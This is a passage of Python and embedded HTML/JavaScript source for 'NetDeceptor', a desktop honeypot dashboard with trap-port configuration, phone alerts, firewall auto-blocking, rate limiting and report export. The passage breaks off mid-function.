    def get_stats(self, range_key):
        return json.dumps(self.db.stats(range_key))

    @pyqtSlot(str, result=str)
    def save_traps(self, payload):
        try:
            data = json.loads(payload)
            traps = ConfigManager.sanitize_traps(data["traps"])
            bind_host = data.get("bind_host", "127.0.0.1")
            if bind_host not in ("127.0.0.1", "0.0.0.0"):
                raise ValueError("Bind address must be 127.0.0.1 or 0.0.0.0")
            self.config.data["traps"] = traps
            self.config.data["bind_host"] = bind_host
            self.config.save()
            status = self.engine.apply_config()
            return json.dumps({"ok": True, "status": {str(k): v for k, v in status.items()},
                               "traps": traps})
        except Exception as e:
            return json.dumps({"ok": False, "error": str(e)})

    @pyqtSlot(str, result=str)
    def save_notify(self, payload):
        try:
            data = json.loads(payload)
            n = self.config.data["notify"]
            for key in n:
                if key in data:
                    n[key] = data[key]
            n["enabled"] = bool(n["enabled"])
            n["min_severity"] = "HIGH" if n["min_severity"] == "HIGH" else "MEDIUM"
            n["cooldown_sec"] = max(0, int(n["cooldown_sec"]))
            self.config.save()
            return json.dumps({"ok": True})
        except Exception as e:
            return json.dumps({"ok": False, "error": str(e)})

    @pyqtSlot(str, result=str)
    def set_lang(self, lang):
        if lang not in ("th", "en"):
            return json.dumps({"ok": False, "error": "unsupported language"})
        self.config.data["lang"] = lang
        self.config.save()
        return json.dumps({"ok": True})

    @pyqtSlot(result=str)
    def test_notify(self):
        if self.config.data.get("lang") == "th":
            msg = "[NetDeceptor] ข้อความทดสอบ - ระบบแจ้งเตือนทำงานปกติ"
        else:
            msg = "[NetDeceptor] Test alert - notifications are working."
        res = self.notifier.send_message(msg)
        return json.dumps([{"channel": c, "ok": ok, "detail": d} for c, ok, d in res])

    @pyqtSlot(str, str, result=str)
    def export_report(self, fmt, range_key):
        try:
            lang, note = self.config.data.get("lang", "th"), None
            if fmt == "pdf":
                if not HAS_REPORTLAB:
                    return json.dumps({"ok": False, "error": "Install reportlab:  pip install reportlab"})
                if lang == "th" and not register_thai_font():
                    lang = "en"
                    note = ("ไม่พบฟอนต์ภาษาไทยสำหรับ PDF จึงสร้างเป็นภาษาอังกฤษแทน — "
                            "วางไฟล์ THSarabunNew.ttf และ \"THSarabunNew Bold.ttf\" ไว้ในโฟลเดอร์ fonts/ ข้างโปรแกรม")
            stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            default = str(Path.home() / f"netdeceptor_report_{stamp}.{fmt}")
            filt = {"pdf": "PDF (*.pdf)", "csv": "CSV (*.csv)", "json": "JSON (*.json)"}.get(fmt, "All files (*)")
            title = "บันทึกรายงาน" if self.config.data.get("lang") == "th" else "Save report"
            path, _ = QFileDialog.getSaveFileName(self.window, title, default, filt)
            if not path:
                return json.dumps({"ok": False, "error": "cancelled"})
            if fmt == "pdf":
                n = export_pdf(self.db, path, range_key, lang)
            elif fmt == "json":
                n = export_json(self.db, path, range_key)
            else:
                n = export_csv(self.db, path, range_key)
            return json.dumps({"ok": True, "path": path, "count": n, "note": note})
        except Exception as e:
            return json.dumps({"ok": False, "error": str(e)})


# ==========================================
# 6. HTML / UI (Glassmorphism Blue Theme)
# ==========================================
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<title>NetDeceptor Enterprise Dashboard</title>
<script src="qrc:///qtwebchannel/qwebchannel.js"></script>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+Thai:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<script>
tailwind.config = { theme: { extend: {
  colors: { brand: { 50:'#F0F7FF',100:'#E0F0FE',500:'#0C9DF0',600:'#007ECC',700:'#0064A7' },
            cyber: { blue:'#0066FF', cyan:'#00A8FF', ice:'#EBF5FF', alert:'#EF4444' } },
  fontFamily: { sans:['Inter','Noto Sans Thai','sans-serif'], mono:['JetBrains Mono','Noto Sans Thai','monospace'] } } } }
</script>
<style>
  body { background:#F8FAFC; font-family:'Inter','Noto Sans Thai',sans-serif; }
  .glass-panel { background:rgba(255,255,255,.9); backdrop-filter:blur(12px); border:1px solid rgba(224,242,254,.9); }
  .tab-btn { padding:.5rem 1rem; border-radius:.75rem; font-size:.8rem; font-weight:600; color:#64748b; }
  .tab-btn:hover { color:#0064A7; }
  .tab-btn.active { background:#0066FF; color:#fff; box-shadow:0 4px 12px rgba(0,102,255,.25); }
  .inp { width:100%; border:1px solid #cbd5e1; border-radius:.5rem; padding:.4rem .6rem; font-size:.8rem; background:#fff; }
  .inp:focus { outline:2px solid #0C9DF0; outline-offset:0; }
  .btn { padding:.45rem .9rem; border-radius:.6rem; font-size:.8rem; font-weight:600; }
  .btn-primary { background:#0066FF; color:#fff; } .btn-primary:hover { background:#0057d9; }
  .btn-ghost { background:#EBF5FF; color:#0064A7; } .btn-ghost:hover { background:#dbeeff; }
  .btn:disabled { opacity:.5; cursor:not-allowed; }
  .toast { position:fixed; right:1rem; bottom:1rem; z-index:50; }
  /* risk pills (threat score) */
  .risk { padding:0 .4rem; border-radius:.3rem; font:700 10px 'JetBrains Mono',monospace; border:1px solid }
  .risk-low { color:#047857; border-color:#a7f3d0; background:#ecfdf5 }
  .risk-medium { color:#0064A7; border-color:#bae6fd; background:#F0F7FF }
  .risk-high { color:#b45309; border-color:#fde68a; background:#fffbeb }
  .risk-critical { color:#be123c; border-color:#fecdd3; background:#fff1f2 }
  .kbd { font:500 11px 'JetBrains Mono',monospace; background:#EBF5FF; border:1px solid #bfdbfe; color:#0064A7; padding:1px 6px; border-radius:5px }
  .codeblock { font:500 11px 'JetBrains Mono',monospace; background:#F1F5F9; border:1px solid #cbd5e1; color:#0f172a; padding:.6rem .75rem; border-radius:.6rem; white-space:pre-wrap; word-break:break-all }
  /* simulator terminal: dark panel, like the topology canvas */
  .term { background:#0f172a; border:1px solid #1e293b; border-radius:.75rem; padding:.75rem; line-height:1.6; color:#cbd5e1 }
  .term-line { word-break:break-word; margin-bottom:.35rem }
  .t-ok { color:#34d399 } .t-warn { color:#fbbf24 } .t-err { color:#f87171 } .t-dim { color:#64748b } .t-cmd { color:#60a5fa }
  /* how-it-works flow */
  .flow { display:grid; grid-template-columns:repeat(8,minmax(0,1fr)); gap:.5rem; align-items:stretch }
  @media (max-width:900px) { .flow { grid-template-columns:repeat(4,minmax(0,1fr)) } }
  .flow-node { position:relative; border:1px solid #cbd5e1; background:#fff; border-radius:.75rem; padding:.7rem .4rem; text-align:center; cursor:pointer; transition:.25s; font-size:11px }
  .flow-node i { font-size:18px; color:#94a3b8; display:block; margin-bottom:.3rem; transition:.25s }
  .flow-node:hover { border-color:#94a3b8 }
  .flow-node.on { border-color:#0066FF; background:#EBF5FF; box-shadow:0 0 0 3px rgba(0,102,255,.15) } .flow-node.on i { color:#0066FF }
  .flow-node.ok { border-color:#34d399; background:#ecfdf5 } .flow-node.ok i { color:#059669 }
  .flow-node.warn { border-color:#f59e0b; background:#fffbeb } .flow-node.warn i { color:#d97706 }
  .flow-node.skip { border-color:#cbd5e1; opacity:.75 }
  .flow-node.sel { outline:2px dashed #0C9DF0; outline-offset:2px }
  .chip { padding:.25rem .7rem; border-radius:999px; font-size:11px; border:1px solid #cbd5e1; color:#475569; cursor:pointer; background:#fff }
  .chip.sel { border-color:#0066FF; color:#0066FF; background:#EBF5FF }
  .sim-card { text-align:left; border:1px solid #cbd5e1; background:#fff; border-radius:.75rem; padding:.75rem; transition:.2s }
  .sim-card:hover:not(:disabled) { border-color:#0066FF; box-shadow:0 4px 14px rgba(0,102,255,.15) } .sim-card:disabled { opacity:.5; cursor:not-allowed }
</style>
</head>
<body class="text-slate-800 min-h-screen flex flex-col p-4 space-y-4">

<header class="glass-panel rounded-2xl p-4 shadow-sm flex justify-between items-center">
  <div class="flex items-center space-x-3">
    <div class="h-10 w-10 rounded-xl bg-gradient-to-tr from-brand-600 to-cyber-cyan flex items-center justify-center text-white shadow-md">
      <i class="fa-solid fa-shield-halved text-xl"></i>
    </div>
    <div>
      <h1 class="font-bold text-lg text-slate-900 leading-none">NetDeceptor Desktop</h1>
      <p class="text-xs text-slate-500 mt-1">Python AsyncIO Honeypot &amp; Threat Inspector</p>
    </div>
  </div>
  <nav class="flex flex-wrap gap-1">
    <button class="tab-btn active" data-tab="dash">Dashboard</button>
    <button class="tab-btn" data-tab="traps">Trap Config</button>
    <button class="tab-btn" data-tab="alerts">Alerts</button>
    <button class="tab-btn" data-tab="defense">Defense</button>
    <button class="tab-btn" data-tab="reports">Reports</button>
    <button class="tab-btn" data-tab="sim">Simulator</button>
    <button class="tab-btn" data-tab="help">Help</button>
  </nav>
  <button id="lang-btn" class="btn btn-ghost" onclick="toggleLang()" title="Language / ภาษา"><i class="fa-solid fa-language"></i> <span id="lang-label">EN</span></button>
  <span class="px-3 py-1 bg-emerald-50 text-emerald-600 border border-emerald-200 rounded-full text-xs font-semibold flex items-center gap-1.5">
    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span> Live Engine Active
  </span>
</header>

<!-- ============ DASHBOARD ============ -->
<section id="tab-dash" class="space-y-4">
  <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
    <div class="glass-panel p-4 rounded-xl"><p class="text-xs font-semibold text-slate-500">ACTIVE TRAPS</p>
      <h3 class="text-2xl font-bold font-mono text-slate-900 mt-1" id="stat-traps">0 Ports</h3></div>
    <div class="glass-panel p-4 rounded-xl"><p class="text-xs font-semibold text-slate-500">INTERCEPTED ATTACKS (ALL TIME)</p>
      <h3 class="text-2xl font-bold font-mono text-slate-900 mt-1" id="stat-total">0</h3></div>
    <div class="glass-panel p-4 rounded-xl"><p class="text-xs font-semibold text-slate-500">TOP TARGET PORT</p>
      <h3 class="text-2xl font-bold font-mono text-slate-900 mt-1" id="stat-top-port">-</h3></div>
    <div class="glass-panel p-4 rounded-xl"><p class="text-xs font-semibold text-slate-500">LAST INTRUDER IP</p>
      <h3 class="text-2xl font-bold font-mono text-brand-600 mt-1" id="stat-last-ip">None</h3></div>
  </div>
  <div class="glass-panel p-4 rounded-2xl">
    <div class="flex items-center justify-between mb-2"><h2 class="font-bold text-sm text-slate-800">Attacks Over Time (last 60 minutes)</h2><span class="text-[10px] font-mono text-slate-500">1 min / bucket</span></div>
    <div><canvas id="timelineCanvas"></canvas></div>
  </div>
  <div class="grid grid-cols-1 lg:grid-cols-12 gap-4">
    <div class="lg:col-span-6 glass-panel p-4 rounded-2xl flex flex-col">
      <h2 class="font-bold text-sm text-slate-800 mb-2">Network Mesh Node Visualizer</h2>
      <div class="relative flex-grow bg-slate-900 rounded-xl overflow-hidden min-h-[300px]">
        <canvas id="topologyCanvas" class="w-full h-full block"></canvas>
      </div>
    </div>
    <div class="lg:col-span-6 glass-panel p-4 rounded-2xl flex flex-col">
      <h2 class="font-bold text-sm text-slate-800 mb-2">Real-time Attack Telemetry Feed <span class="text-slate-400 font-normal">(persisted to SQLite)</span></h2>
      <div id="log-feed" class="flex-grow overflow-y-auto space-y-2 max-h-[330px] font-mono text-xs pr-1"></div>
    </div>
  </div>
  <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
    <div class="glass-panel p-4 rounded-2xl"><h2 class="font-bold text-sm text-slate-800 mb-3">Top Attack Types</h2>
      <div id="dash-types" class="space-y-2"></div></div>
    <div class="glass-panel p-4 rounded-2xl"><h2 class="font-bold text-sm text-slate-800 mb-3">Top Countries</h2>
      <div id="dash-countries" class="space-y-2"></div></div>
  </div>
</section>

<!-- ============ TRAP CONFIG ============ -->
<section id="tab-traps" class="hidden glass-panel rounded-2xl p-5 space-y-4">
  <div class="flex flex-wrap items-center justify-between gap-3">
    <div>
      <h2 class="font-bold text-slate-900">Dynamic Trap Configuration</h2>
      <p class="text-xs text-slate-500">Toggle ports and edit banners. Changes apply instantly - no restart needed.</p>
    </div>
    <div class="flex items-center gap-2 text-xs">
      <label class="font-semibold text-slate-600">Bind address</label>
      <select id="bind-host" class="inp !w-auto">
        <option value="127.0.0.1">127.0.0.1 (local only)</option>
        <option value="0.0.0.0">0.0.0.0 (all interfaces)</option>
      </select>
    </div>
  </div>
  <p class="text-[11px] text-amber-600 bg-amber-50 border border-amber-200 rounded-lg px-3 py-2">
    Ports below 1024 (21, 22, 80, 445...) may need administrator/root rights, or may already be used by real services. Status shows "error" in that case.
  </p>
  <div id="trap-list" class="space-y-3"></div>
  <div class="flex gap-2">
    <button class="btn btn-ghost" onclick="addTrap()"><i class="fa-solid fa-plus"></i> Add trap</button>
    <button class="btn btn-primary" onclick="saveTraps()"><i class="fa-solid fa-floppy-disk"></i> Save &amp; apply</button>
  </div>
</section>

<!-- ============ ALERTS ============ -->
<section id="tab-alerts" class="hidden glass-panel rounded-2xl p-5 space-y-4 max-w-3xl">
  <div>
    <h2 class="font-bold text-slate-900">Real-time Alert Notifications</h2>
    <p class="text-xs text-slate-500">Send a message to your phone the moment a trap is hit. Tokens are stored locally in netdeceptor_config.json.</p>
  </div>
  <label class="flex items-center gap-2 text-sm font-semibold"><input type="checkbox" id="n-enabled"> Enable alerts</label>
  <div class="grid grid-cols-2 gap-3 text-xs">
    <div><label class="font-semibold text-slate-600">Minimum severity</label>
      <select id="n-sev" class="inp"><option value="HIGH">HIGH only</option><option value="MEDIUM">MEDIUM and above (everything)</option></select></div>
    <div><label class="font-semibold text-slate-600">Cooldown per IP (seconds)</label>
      <input id="n-cool" type="number" min="0" class="inp"></div>
  </div>
  <div class="border-t pt-3">
    <h3 class="text-sm font-bold mb-2"><i class="fa-brands fa-telegram text-cyber-cyan"></i> Telegram Bot</h3>
    <div class="grid grid-cols-2 gap-3 text-xs">
      <div><label class="font-semibold text-slate-600">Bot token (from @BotFather)</label><input id="n-tg-token" type="password" class="inp" autocomplete="off"></div>
      <div><label class="font-semibold text-slate-600">Chat ID</label><input id="n-tg-chat" class="inp"></div>
    </div>
  </div>
  <div class="border-t pt-3">
    <h3 class="text-sm font-bold mb-1"><i class="fa-brands fa-line text-emerald-500"></i> LINE Messaging API</h3>
    <p class="text-[11px] text-slate-500 mb-2">LINE Notify was shut down in March 2025, so this uses a LINE Official Account's Messaging API push message instead.</p>
    <div class="grid grid-cols-2 gap-3 text-xs">
      <div><label class="font-semibold text-slate-600">Channel access token</label><input id="n-line-token" type="password" class="inp" autocomplete="off"></div>
      <div><label class="font-semibold text-slate-600">Your user ID (U...)</label><input id="n-line-user" class="inp"></div>
    </div>
  </div>
  <div class="flex gap-2 items-center">
    <button class="btn btn-primary" onclick="saveNotify()">Save</button>
    <button class="btn btn-ghost" onclick="testNotify()"><i class="fa-solid fa-paper-plane"></i> Send test</button>
    <span id="n-result" class="text-xs text-slate-500"></span>
  </div>
</section>

<!-- ============ DEFENSE ============ -->
<section id="tab-defense" class="hidden space-y-4">
  <div class="glass-panel rounded-2xl p-5 space-y-4">
    <div class="flex flex-wrap items-center justify-between gap-2">
      <div><h2 class="font-bold text-slate-900">Active Defense &amp; Firewall</h2>
        <p class="text-xs text-slate-500">Automatically block repeat attackers at the OS firewall.</p></div>
      <div class="flex gap-2 text-[11px]" id="def-badges"></div>
    </div>
    <p class="text-[11px] text-amber-700 bg-amber-50 border border-amber-200 rounded-lg px-3 py-2">Dry-run is ON by default: blocks are only logged and no firewall rule is created. Loopback, link-local and this machine's own addresses are never blocked. Windows needs the program started as administrator.</p>
    <div class="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
      <label class="flex items-center gap-2 font-semibold"><input type="checkbox" id="d-enabled"> Enable active defense</label>
      <label class="flex items-center gap-2 font-semibold"><input type="checkbox" id="d-dry"> Dry-run (log only, do not touch the firewall)</label>
      <label class="flex items-center gap-2 font-semibold"><input type="checkbox" id="d-priv"> Never block private / LAN addresses</label>
      <label class="flex items-center gap-2 font-semibold"><input type="checkbox" id="d-high"> Block immediately on HIGH severity</label>
      <label class="flex items-center gap-2 font-semibold"><input type="checkbox" id="d-flood"> Block immediately on DoS / flood</label>
      <span></span>
      <div><label class="font-semibold text-slate-600">Block after N attacks</label><input id="d-thr" type="number" min="1" class="inp"></div>
      <div><label class="font-semibold text-slate-600">Counting window (seconds)</label><input id="d-win" type="number" min="10" class="inp"></div>
      <div><label class="font-semibold text-slate-600">Auto-unblock after (minutes, 0 = never)</label><input id="d-auto" type="number" min="0" class="inp"></div>
    </div>
    <div class="text-xs"><label class="font-semibold text-slate-600">Allowlist (one IP or CIDR per line)</label>
      <textarea id="d-allow" rows="2" class="inp font-mono" placeholder="203.0.113.10&#10;198.51.100.0/24"></textarea></div>
  </div>

  <div class="glass-panel rounded-2xl p-5 space-y-3">
    <div><h2 class="font-bold text-slate-900">Rate Limiting &amp; Resource Protection</h2>
      <p class="text-xs text-slate-500">Token bucket per source IP plus global caps keep the engine and the dashboard smooth during a flood.</p></div>
    <div class="grid grid-cols-2 md:grid-cols-5 gap-3 text-xs">
      <label class="flex items-center gap-2 font-semibold"><input type="checkbox" id="l-enabled"> Enable rate limiting</label>
      <div><label class="font-semibold text-slate-600">Connections per second per IP</label><input id="l-rate" type="number" step="0.1" min="0.1" class="inp"></div>
      <div><label class="font-semibold text-slate-600">Burst size per IP</label><input id="l-burst" type="number" min="1" class="inp"></div>
      <div><label class="font-semibold text-slate-600">Max concurrent connections</label><input id="l-conc" type="number" min="10" class="inp"></div>
      <div><label class="font-semibold text-slate-600">Max UI events per second</label><input id="l-ui" type="number" min="1" class="inp"></div>
    </div>
    <p id="l-stats" class="text-xs font-mono text-slate-500"></p>
  </div>

  <div class="glass-panel rounded-2xl p-5 space-y-3">
    <div><h2 class="font-bold text-slate-900">IP Geolocation (offline GeoLite2)</h2>
      <p class="text-xs text-slate-500">Place GeoLite2-City.mmdb (or GeoLite2-Country.mmdb) next to the program and run: pip install geoip2. Without it, only private/LAN addresses are labelled.</p></div>
    <div class="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs items-end">
      <div><label class="font-semibold text-slate-600">Path to .mmdb file (optional)</label><input id="g-path" class="inp font-mono"></div>
      <p id="g-status" class="font-mono text-slate-500"></p>
    </div>
    <div class="flex gap-2"><button class="btn btn-primary" onclick="saveDefense()"><i class="fa-solid fa-floppy-disk"></i> Save settings</button></div>
  </div>

  <div class="glass-panel rounded-2xl p-5">
    <div class="flex flex-wrap items-center justify-between gap-2 mb-3"><h2 class="font-bold text-slate-900">Blocked IPs</h2>
      <div class="flex gap-2"><input id="m-ip" class="inp font-mono !w-44" placeholder="IP address">
        <button class="btn btn-ghost" onclick="manualBlock()">Block IP</button>
        <button class="btn btn-ghost" onclick="whitelist(document.getElementById('m-ip').value)">Whitelist IP</button></div></div>
    <div id="allow-chips" class="flex flex-wrap gap-2 mb-3"></div>
    <div class="overflow-x-auto"><table class="w-full text-xs">
      <thead><tr class="text-left text-slate-500 border-b"><th class="py-1.5 pr-3">IP</th><th class="pr-3">Time</th><th class="pr-3">Reason</th><th class="pr-3">Status</th><th></th></tr></thead>
      <tbody id="blk-body" class="font-mono"></tbody></table></div>
  </div>
</section>

<!-- ============ SIMULATOR ============ -->
<section id="tab-sim" class="hidden space-y-4"><div id="sim-root" class="space-y-4"></div></section>

<!-- ============ HELP ============ -->
<section id="tab-help" class="hidden space-y-4"><div id="help-root" class="space-y-4"></div></section>

<!-- ============ REPORTS ============ -->
<section id="tab-reports" class="hidden space-y-4">
  <div class="glass-panel rounded-2xl p-5 flex flex-wrap items-end justify-between gap-3">
    <div>
      <h2 class="font-bold text-slate-900">Security Audit Report</h2>
      <p class="text-xs text-slate-500">Statistics are read straight from the SQLite database.</p>
    </div>
    <div class="flex items-end gap-2">
      <div><label class="text-xs font-semibold text-slate-600">Period</label>
        <select id="r-range" class="inp" onchange="loadReport()">
          <option value="24h">Last 24 hours</option><option value="7d">Last 7 days</option>
          <option value="30d">Last 30 days</option><option value="all" selected>All time</option>
        </select></div>
      <button class="btn btn-ghost" onclick="doExport('csv')"><i class="fa-solid fa-file-csv"></i> Export CSV</button>
      <button class="btn btn-ghost" onclick="doExport('json')"><i class="fa-solid fa-file-code"></i> Export JSON</button>
      <button class="btn btn-primary" onclick="doExport('pdf')"><i class="fa-solid fa-file-pdf"></i> Export PDF</button>
    </div>
  </div>
  <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
    <div class="glass-panel p-4 rounded-xl"><p class="text-xs font-semibold text-slate-500">TOTAL</p><h3 class="text-2xl font-bold font-mono" id="r-total">0</h3></div>
    <div class="glass-panel p-4 rounded-xl"><p class="text-xs font-semibold text-slate-500">UNIQUE IPs</p><h3 class="text-2xl font-bold font-mono" id="r-unique">0</h3></div>
    <div class="glass-panel p-4 rounded-xl"><p class="text-xs font-semibold text-slate-500">HIGH SEVERITY</p><h3 class="text-2xl font-bold font-mono text-rose-600" id="r-high">0</h3></div>
  </div>
  <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
    <div class="glass-panel p-4 rounded-2xl"><h3 class="font-bold text-sm mb-3">Attacks by hour of day</h3>
      <div id="r-hourly" class="flex items-end gap-[3px] h-40"></div>
      <div class="flex justify-between text-[10px] text-slate-400 mt-1"><span>00</span><span>06</span><span>12</span><span>18</span><span>23</span></div></div>
    <div class="glass-panel p-4 rounded-2xl"><h3 class="font-bold text-sm mb-3">Top attacker IPs</h3>
      <table class="w-full text-xs font-mono"><tbody id="r-ips"></tbody></table></div>
  </div>
  <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
    <div class="glass-panel p-4 rounded-2xl"><h3 class="font-bold text-sm mb-3">Top Attack Types</h3><div id="r-types" class="space-y-2"></div></div>
    <div class="glass-panel p-4 rounded-2xl"><h3 class="font-bold text-sm mb-3">Top Countries</h3><div id="r-countries" class="space-y-2"></div></div>
  </div>
  <div class="glass-panel rounded-2xl p-5 space-y-2">
    <div class="flex flex-wrap items-center justify-between gap-2">
      <div><h3 class="font-bold text-sm text-slate-900">Log Integrity (SHA-256 hash chain)</h3>
        <p class="text-xs text-slate-500">Each record is hashed together with the previous record's hash. Editing or deleting any record breaks the chain.</p></div>
      <button class="btn btn-ghost" onclick="verifyIntegrity()"><i class="fa-solid fa-shield-halved"></i> Verify now</button>
    </div>
    <p id="integrity-result" class="text-xs font-mono"></p>
  </div>
</section>

<div id="wiz" class="hidden fixed inset-0 z-40 flex items-center justify-center p-4" style="background:rgba(15,23,42,.45);backdrop-filter:blur(4px)">
  <div class="glass-panel rounded-2xl w-full max-w-2xl max-h-[90vh] flex flex-col">
    <div class="p-5 border-b flex items-start justify-between gap-3">
      <div><div id="wiz-step" class="text-[11px] font-mono text-brand-600"></div><h2 id="wiz-title" class="font-bold text-lg text-slate-900"></h2></div>
      <button onclick="wizClose()" class="text-slate-400 text-lg leading-none" title="Close">&times;</button>
    </div>
    <div id="wiz-body" class="p-5 overflow-y-auto text-sm space-y-3 text-slate-700"></div>
    <div class="p-4 border-t flex items-center justify-between gap-3">
      <div id="wiz-dots" class="flex gap-1.5"></div>
      <div class="flex gap-2"><button id="wiz-back" class="btn btn-ghost" onclick="wizBack()"></button><button id="wiz-next" class="btn btn-primary" onclick="wizNext()"></button></div>
    </div>
  </div>
</div>
<div id="toast" class="toast hidden px-4 py-2 rounded-xl text-sm text-white shadow-lg"></div>

<script>
let bridge = null;
let state = null;
let attackCount = 0;
const portCounts = {};

function esc(s) {   // attacker-controlled text must never reach innerHTML unescaped
  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
function toast(msg, ok = true) {
  const t = document.getElementById('toast');
  t.textContent = msg; t.className = 'toast px-4 py-2 rounded-xl text-sm text-white shadow-lg ' + (ok ? 'bg-emerald-600' : 'bg-rose-600');
  clearTimeout(t._h); t._h = setTimeout(() => t.classList.add('hidden'), 3500);
}
const call = (fn, ...args) => new Promise(res => bridge[fn](...args, r => res(JSON.parse(r))));

// ---------- tabs ----------
document.querySelectorAll('.tab-btn').forEach(b => b.onclick = () => {
  document.querySelectorAll('.tab-btn').forEach(x => x.classList.remove('active'));
  b.classList.add('active');
  ['dash','traps','alerts','defense','reports','sim','help'].forEach(t =>
    document.getElementById('tab-' + t).classList.toggle('hidden', t !== b.dataset.tab));
  if (b.dataset.tab === 'dash') setTimeout(resizeCanvas, 50);
  if (b.dataset.tab === 'reports') loadReport();
  if (b.dataset.tab === 'defense') loadDefense();
  if (b.dataset.tab === 'dash') setTimeout(drawTimeline, 60);
  if (b.dataset.tab === 'help') renderHelp();
  if (b.dataset.tab === 'sim') renderSim();
});

// ---------- dashboard ----------
function riskLevel(sc) { sc = sc || 0; return sc < 30 ? 'LOW' : sc < 60 ? 'MEDIUM' : sc < 80 ? 'HIGH' : 'CRITICAL'; }
function riskLabel(l) { return LANG === 'th' ? { LOW: 'ต่ำ', MEDIUM: 'กลาง', HIGH: 'สูง', CRITICAL: 'วิกฤต' }[l] : l; }
function riskPill(sc) {
  if (sc === undefined || sc === null) return '';
  const l = riskLevel(sc);
  return `<span class="risk risk-${l.toLowerCase()}">${sc} ${esc(riskLabel(l))}</span>`;
}
function feedItem(d, live = false) {
  const item = document.createElement('div');
  item.className = 'p-3 bg-white rounded-lg border border-slate-200 shadow-sm flex justify-between items-center';
  const time = (d.timestamp.split(' ')[1] || d.timestamp);
  const sev = d.severity === 'HIGH' ? 'bg-rose-100 text-rose-700' : 'bg-amber-100 text-amber-700';
  const typ = d.attack_type ? `<span class="px-1.5 py-0.5 rounded bg-indigo-100 text-indigo-700 font-bold text-[10px] ml-1">${esc(t(d.attack_type))}</span>` : '';
  const blk = d.blocked === 'blocked' ? ' <span class="px-1.5 py-0.5 rounded bg-slate-800 text-white font-bold text-[10px] ml-1">BLOCKED</span>'
            : d.blocked === 'dry_run' ? ' <span class="px-1.5 py-0.5 rounded bg-slate-200 text-slate-600 font-bold text-[10px] ml-1">DRY-RUN</span>' : '';
  item.innerHTML = `
    <div>
      <span class="px-1.5 py-0.5 rounded ${sev} font-bold text-[10px] mr-2">${t('PORT')} ${esc(d.port)}</span>
      ${flagHtml(d.country_code)} <strong class="text-slate-800">${esc(d.ip)}</strong>${typ} ${riskPill(d.threat_score)}${blk}
      <div class="text-[11px] text-slate-400 mt-0.5">${esc(d.service)} • ${esc(d.payload.replace(/\s+/g, ' ').substring(0, 35))}</div>
    </div>
    <span class="text-[10px] text-slate-400">${esc(time)}</span>`;
  return item;
}
function renderTopPort() {
  const top = Object.entries(portCounts).sort((a, b) => b[1] - a[1])[0];
  document.getElementById('stat-top-port').innerText = top ? t('Port') + ' ' + top[0] : '-';
}
let tlPending = false;
function onAttackDetected(data) {            // called from Python via runJavaScript
  attackCount++;
  portCounts[data.port] = (portCounts[data.port] || 0) + 1;
  if (data.attack_type) typeCounts[data.attack_type] = (typeCounts[data.attack_type] || 0) + 1;
  if (data.country_code) countryCounts[data.country_code] = (countryCounts[data.country_code] || 0) + 1;
  document.getElementById('stat-total').innerText = attackCount;
  document.getElementById('stat-last-ip').innerText = data.ip;
  renderTopPort(); renderBreakdowns();
  const feed = document.getElementById('log-feed');
  if (feed.dataset.empty === '1') { feed.innerHTML = ''; feed.dataset.empty = '0'; }
  feed.prepend(feedItem(data, true));
  while (feed.children.length > 200) feed.removeChild(feed.lastChild);   // keep the DOM small
  spawnNode(data);
  if (timeline.data.length) {
    timeline.data[timeline.data.length - 1]++;
    if (!tlPending) { tlPending = true; requestAnimationFrame(() => { tlPending = false; drawTimeline(); }); }
  }
}
function updateActiveTraps() {
  const n = state.config.traps.filter(t => t.enabled).length;
  document.getElementById('stat-traps').innerText = n + ' ' + (LANG === 'th' ? 'พอร์ต' : (n === 1 ? 'Port' : 'Ports'));
}

// ---------- topology canvas ----------
const canvas = document.getElementById('topologyCanvas');
const ctx = canvas.getContext('2d');
let nodes = [];
function resizeCanvas() { canvas.width = canvas.parentElement.clientWidth; canvas.height = canvas.parentElement.clientHeight; }
window.addEventListener('resize', resizeCanvas);
setTimeout(resizeCanvas, 100);
function spawnNode(d) {
  const ex = nodes.find(n => n.ip === d.ip);
  if (ex) { ex.pulse = 1; return; }
  nodes.push({ ip: d.ip, angle: Math.random() * Math.PI * 2, r: 70 + Math.random() * 90,
               speed: (Math.random() * .004 + .001) * (Math.random() < .5 ? -1 : 1),
               high: d.severity === 'HIGH', pulse: 1 });
  if (nodes.length > 14) nodes.shift();
}
function drawTopology() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  const cx = canvas.width / 2, cy = canvas.height / 2;
  for (const n of nodes) {
    n.angle += n.speed; n.pulse = Math.max(0, n.pulse - .01);
    const x = cx + Math.cos(n.angle) * n.r, y = cy + Math.sin(n.angle) * n.r;
    ctx.beginPath(); ctx.moveTo(cx, cy); ctx.lineTo(x, y);
    ctx.strokeStyle = `rgba(${n.high ? '239,68,68' : '96,165,250'},${.15 + n.pulse * .6})`; ctx.lineWidth = 1 + n.pulse * 2; ctx.stroke();
    ctx.beginPath(); ctx.arc(x, y, 5 + n.pulse * 3, 0, Math.PI * 2);
    ctx.fillStyle = n.high ? '#EF4444' : '#F59E0B'; ctx.fill();
    ctx.fillStyle = '#94A3B8'; ctx.font = '10px JetBrains Mono, monospace'; ctx.fillText(n.ip, x + 9, y + 3);
  }
  ctx.beginPath(); ctx.arc(cx, cy, 14, 0, Math.PI * 2);
  ctx.fillStyle = '#0066FF'; ctx.fill(); ctx.strokeStyle = '#60A5FA'; ctx.lineWidth = 3; ctx.stroke();
  requestAnimationFrame(drawTopology);
}
drawTopology();

// ---------- trap config ----------
let trapDraft = [];
function statusBadge(port) {
  const s = (state.status || {})[port];
